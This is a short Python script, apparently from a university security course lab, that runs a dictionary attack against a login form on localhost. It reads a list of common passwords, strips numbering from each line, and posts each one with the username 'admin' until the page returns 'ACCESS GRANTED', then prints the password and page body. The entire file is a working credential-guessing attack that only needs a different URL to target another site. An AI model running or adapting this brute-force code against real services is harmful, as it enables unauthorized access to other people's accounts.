import requests

# Runs the attack
def dictionary_attack():
    target_url = "http://localhost:8080/login"
    
    # Read pswd list from file
    passwords = []
    with open("/home/omimahomie/cs357/wordlists/hundredCommonPswds.txt", "r") as f:
        for line in f:
            line = line.strip()
            # Cut out the beginning & end from each line (the X. and (length Y))
            if '. ' in line and ' (length ' in line:
                temp = line.split('. ', 1)[1]
                password = temp.split(' (length ')[0]

                passwords.append(password)
            else:
                passwords.append(line)
    
    name = "om khadka"
    
    for password in passwords:
        # Prep the form data
        data = {
            "username": "admin",
            "name": name,
            "password": password
        }
        
        # Send POST request
        response = requests.post(target_url, data=data)
        
        # Login succes
        if "ACCESS GRANTED" in response.text:
            print(f"SUCCESS! Password found: {password}")
            print("="*50)
            print("Body:")
            print("="*50)
            print(response.text)
            print("="*50)
            print("END")
            return password
    
    # No pswds valid
    print("Password not found in the list")
    return None

if __name__ == "__main__":
    dictionary_attack()